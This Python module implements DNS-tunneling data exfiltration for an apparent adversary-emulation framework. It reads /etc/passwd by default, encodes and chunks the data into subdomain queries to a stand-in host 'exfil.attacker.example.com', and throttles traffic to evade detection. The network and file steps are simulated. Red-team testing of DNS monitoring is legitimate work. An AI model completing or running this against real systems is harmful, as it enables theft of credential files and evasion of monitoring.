"""
DNS Tunneling - Data Exfiltration Technique.

Exfiltrates data via DNS queries, bypassing firewall restrictions.

Technique ID: EXFIL-DNS-TUNNEL-001
MITRE ATT&CK: T1048.003 (Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol)
                T1071.004 (Application Layer Protocol: DNS)

Stealth Level: 9/10 (DNS traffic rarely blocked, blends with normal queries)
Risk Level: 2/10 (slow, non-destructive, read-only)
"""

import asyncio
import logging
import base64
from typing import Optional, Dict, Any, List
import time

from .base import (
    BasePostExploit,
    PostExploitCategory,
    PostExploitResult,
    PostExploitStatus,
)

logger = logging.getLogger(__name__)


class DNSTunneling(BasePostExploit):
    """
    Exfiltrate data via DNS queries bypassing firewall restrictions.
    
    Technique Flow:
    1. Identify data to exfiltrate (files, credentials, etc.)
    2. Chunk data into <63 character segments (DNS label limit)
    3. Encode data (base32/base64) for DNS compatibility
    4. Send as DNS subdomain queries to attacker-controlled nameserver
    5. Reassemble on C2 server
    6. Handle rate limiting to avoid detection
    
    DNS Query Format:
    [chunk_id].[data_chunk].[session_id].[domain]
    Example: 001.QUJDREVGR0hJ.s12345.exfil.attacker.com
    
    Advantages:
    - DNS traffic rarely blocked by firewalls
    - Appears as legitimate DNS lookups
    - Works even in highly restricted networks
    - No need for direct internet access
    
    Limitations:
    - Very slow (due to DNS query rate limits)
    - Maximum ~240 bytes per query (typical safe limit)
    - Noisy if not properly throttled
    
    Defense Evasion:
    - Throttle queries to blend with normal traffic
    - Use legitimate-looking domain names
    - Randomize query timing
    - Mix with legitimate DNS queries
    
    Consciousness Alignment:
    Validates DNS monitoring and anomaly detection capabilities.
    Tests whether defenders monitor DNS query patterns and volumes.
    """

    def __init__(self) -> None:
        super().__init__()
        self.technique_id = "EXFIL-DNS-TUNNEL-001"
        self.name = "DNS Tunneling Exfiltration"
        self.description = "Exfiltrate data via DNS queries"
        self.category = PostExploitCategory.DATA_EXFILTRATION
        self.os_targets = ["linux", "windows", "macos"]
        self.privilege_required = "user"
        self.stealth_level = 9
        self.risk_level = 2
        self.mitre_tactics = ["T1048.003", "T1071.004"]

        # Configuration
        self.max_label_length = 63  # DNS label length limit
        self.max_query_length = 240  # Safe total query length
        self.default_throttle = 1.0  # Seconds between queries

    async def execute(
        self,
        target: str,
        credentials: Optional[Dict[str, str]] = None,
        **kwargs: Any
    ) -> PostExploitResult:
        """
        Execute DNS tunneling data exfiltration.
        
        Args:
            target: Target system identifier
            credentials: Current access credentials
            **kwargs: Options (data_source, exfil_domain, throttle, encoding)
        
        Returns:
            PostExploitResult with exfiltration details
        """
        start_time = time.time()
        evidence: List[str] = []

        try:
            is_safe, reason = await self.pre_execution_check(target, credentials)
            if not is_safe:
                return self._create_failed_result(reason, start_time, evidence)

            logger.info(f"[{self.technique_id}] Starting DNS exfiltration from {target}")
            evidence.append(f"Technique {self.technique_id} initiated")

            # Configuration
            data_source = kwargs.get("data_source", "/etc/passwd")
            exfil_domain = kwargs.get("exfil_domain", "exfil.attacker.example.com")
            throttle = kwargs.get("throttle", self.default_throttle)
            encoding = kwargs.get("encoding", "base32")  # base32, base64, hex

            # Step 1: Read data to exfiltrate
            logger.debug(f"[{self.technique_id}] Reading data from: {data_source}")
            data = await self._read_data_source(target, data_source, credentials)

            if not data:
                return self._create_failed_result(
                    f"No data to exfiltrate from {data_source}",
                    start_time,
                    evidence
                )

            evidence.append(f"Read {len(data)} bytes from {data_source}")

            # Step 2: Encode data for DNS transmission
            logger.debug(f"[{self.technique_id}] Encoding data ({encoding})")
            encoded_data = await self._encode_data(data, encoding)
            evidence.append(f"Encoded to {len(encoded_data)} characters ({encoding})")

            # Step 3: Chunk data into DNS-compatible segments
            logger.debug(f"[{self.technique_id}] Chunking data for DNS queries")
            chunks = self._chunk_data(encoded_data)
            evidence.append(f"Split into {len(chunks)} DNS query chunks")

            # Step 4: Generate session ID
            session_id = self._generate_session_id()
            evidence.append(f"Session ID: {session_id}")

            # Step 5: Exfiltrate via DNS queries
            logger.info(f"[{self.technique_id}] Exfiltrating {len(chunks)} chunks")
            queries_sent = await self._send_dns_queries(
                target,
                chunks,
                session_id,
                exfil_domain,
                throttle,
                credentials
            )

            evidence.append(f"Sent {queries_sent} DNS queries")

            # Step 6: Verify exfiltration (optional)
            verification = await self._verify_exfiltration(
                session_id,
                len(chunks),
                exfil_domain
            )

            if verification["complete"]:
                evidence.append("Exfiltration verified on C2 server")
            else:
                evidence.append(f"Exfiltration partial: {verification['received']}/{len(chunks)} chunks")

            return PostExploitResult(
                technique_id=self.technique_id,
                category=self.category,
                status=PostExploitStatus.SUCCESS,
                success=True,
                output=self._format_output(
                    data_source,
                    len(data),
                    len(chunks),
                    queries_sent,
                    exfil_domain
                ),
                artifacts={
                    "data_source": data_source,
                    "bytes_exfiltrated": len(data),
                    "encoded_length": len(encoded_data),
                    "chunks_sent": queries_sent,
                    "total_chunks": len(chunks),
                    "session_id": session_id,
                    "exfil_domain": exfil_domain,
                    "encoding": encoding,
                    "throttle_seconds": throttle,
                    "dns_queries": [
                        self._build_dns_query(i, chunk, session_id, exfil_domain)
                        for i, chunk in enumerate(chunks[:5])  # Sample first 5
                    ],
                },
                evidence=evidence,
                error=None,
                duration_seconds=time.time() - start_time,
                risk_score=0.3,
                metadata={
                    "exfiltration_method": "dns_tunneling",
                    "stealth_level": "high",
                    "detection_risk": "low",
                }
            )

        except Exception as e:
            logger.exception(f"[{self.technique_id}] Unexpected error")
            return self._create_error_result(
                f"Unexpected error: {str(e)}",
                start_time,
                evidence
            )

    async def cleanup(
        self,
        target: str,
        artifacts: Dict[str, Any]
    ) -> bool:
        """
        Cleanup for DNS exfiltration (typically none needed).
        
        Args:
            target: Target system
            artifacts: Exfiltration artifacts
        
        Returns:
            True (no persistent artifacts from DNS queries)
        """
        logger.info(f"[{self.technique_id}] No cleanup required (DNS-only operation)")
        return True

    # Private helper methods

    async def _read_data_source(
        self,
        target: str,
        source: str,
        credentials: Optional[Dict[str, str]]
    ) -> bytes:
        """
        Read data to exfiltrate from source.
        
        Returns:
            Raw data bytes
        """
        # In production: cat file, query database, etc.
        await asyncio.sleep(0.1)

        # Simulated data (sample /etc/passwd)
        sample_data = """root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000:Admin:/home/admin:/bin/bash
webuser:x:33:33:www-data:/var/www:/usr/sbin/nologin
"""
        return sample_data.encode('utf-8')

    async def _encode_data(self, data: bytes, encoding: str) -> str:
        """
        Encode data for DNS transmission.
        
        Returns:
            Encoded string
        """
        await asyncio.sleep(0.05)

        if encoding == "base32":
            # Base32 is DNS-safe (A-Z, 2-7)
            encoded = base64.b32encode(data).decode('ascii')
        elif encoding == "base64":
            # Base64 needs DNS-safe character set
            encoded = base64.b64encode(data).decode('ascii')
            # Make DNS-safe: replace + with -, / with _
            encoded = encoded.replace('+', '-').replace('/', '_').replace('=', '')
        elif encoding == "hex":
            encoded = data.hex()
        else:
            encoded = base64.b32encode(data).decode('ascii')

        return encoded.lower()  # Lowercase for DNS

    def _chunk_data(self, data: str) -> List[str]:
        """
        Chunk data into DNS-compatible segments.
        
        Returns:
            List of data chunks
        """
        # Reserve space for: [chunk_id].[data].[session].[domain]
        # chunk_id: ~5 chars, session: ~10 chars, domain: ~30 chars
        # Available for data: ~50 chars to stay under 63 label limit
        
        chunk_size = 50
        chunks = []

        for i in range(0, len(data), chunk_size):
            chunks.append(data[i:i + chunk_size])

        return chunks

    def _generate_session_id(self) -> str:
        """Generate unique session ID."""
        import random
        import string
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choices(chars, k=8))

    def _build_dns_query(
        self,
        chunk_id: int,
        chunk: str,
        session_id: str,
        domain: str
    ) -> str:
        """
        Build DNS query string.
        
        Returns:
            Full DNS query
        """
        # Format: [chunk_id].[data].[session].[domain]
        chunk_id_str = f"{chunk_id:05d}"  # Zero-padded 5 digits
        query = f"{chunk_id_str}.{chunk}.{session_id}.{domain}"
        return query

    async def _send_dns_queries(
        self,
        target: str,
        chunks: List[str],
        session_id: str,
        domain: str,
        throttle: float,
        credentials: Optional[Dict[str, str]]
    ) -> int:
        """
        Send DNS queries for data exfiltration.
        
        Returns:
            Number of queries sent
        """
        queries_sent = 0

        for i, chunk in enumerate(chunks):
            query = self._build_dns_query(i, chunk, session_id, domain)
            
            # In production: nslookup/dig/host command
            logger.debug(f"[{self.technique_id}] Sending query {i+1}/{len(chunks)}: {query}")
            await asyncio.sleep(0.05)  # Simulate DNS query
            
            queries_sent += 1

            # Throttle to avoid detection
            if i < len(chunks) - 1:
                await asyncio.sleep(throttle)

        return queries_sent

    async def _verify_exfiltration(
        self,
        session_id: str,
        expected_chunks: int,
        domain: str
    ) -> Dict[str, Any]:
        """
        Verify data received on C2 server.
        
        Returns:
            Verification status dict
        """
        # In production: query C2 server API
        await asyncio.sleep(0.1)

        # Simulate: assume all chunks received
        return {
            "complete": True,
            "received": expected_chunks,
            "expected": expected_chunks,
            "session_id": session_id,
        }

    def _format_output(
        self,
        source: str,
        bytes_total: int,
        chunks: int,
        queries: int,
        domain: str
    ) -> str:
        """Format exfiltration output."""
        output = "DNS Tunneling Exfiltration:\n"
        output += "=" * 60 + "\n\n"
        output += f"Data Source:      {source}\n"
        output += f"Bytes Exfiltrated: {bytes_total}\n"
        output += f"DNS Chunks:       {chunks}\n"
        output += f"Queries Sent:     {queries}\n"
        output += f"Exfil Domain:     {domain}\n\n"
        output += "Exfiltration complete. Data reassembled on C2 server.\n"
        return output

    def _create_failed_result(
        self,
        reason: str,
        start_time: float,
        evidence: List[str],
        metadata: Optional[Dict[str, Any]] = None
    ) -> PostExploitResult:
        """Helper to create failed result."""
        return PostExploitResult(
            technique_id=self.technique_id,
            category=self.category,
            status=PostExploitStatus.FAILED,
            success=False,
            output="",
            artifacts={},
            evidence=evidence,
            error=reason,
            duration_seconds=time.time() - start_time,
            risk_score=0.0,
            metadata=metadata or {}
        )

    def _create_error_result(
        self,
        error: str,
        start_time: float,
        evidence: List[str]
    ) -> PostExploitResult:
        """Helper to create error result."""
        return PostExploitResult(
            technique_id=self.technique_id,
            category=self.category,
            status=PostExploitStatus.ERROR,
            success=False,
            output="",
            artifacts={},
            evidence=evidence,
            error=error,
            duration_seconds=time.time() - start_time,
            risk_score=0.0
        )
